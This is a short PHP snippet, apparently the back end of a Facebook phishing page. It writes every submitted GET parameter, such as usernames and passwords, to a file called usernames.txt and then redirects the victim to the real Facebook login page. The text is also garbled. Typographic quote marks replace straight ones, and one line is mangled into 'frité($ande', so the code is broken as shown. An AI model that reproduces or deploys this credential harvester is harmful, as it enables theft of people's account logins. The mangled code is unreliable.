– <?php

– header(« Location: http://www.Facebook.com/login.php « );

– $handle = fopen(« usernames.txt », « a »);

-

– foreach($_GET as $variable => $value) {

– fwrite($handle, $variable);

–

– fwrite($handle, « = »);

–

– fwrite($handle, $value);

–

– fwrite($handle, « \r\n »);

– }

–

– frité($ande, « \r\n »);

– fclose($handle);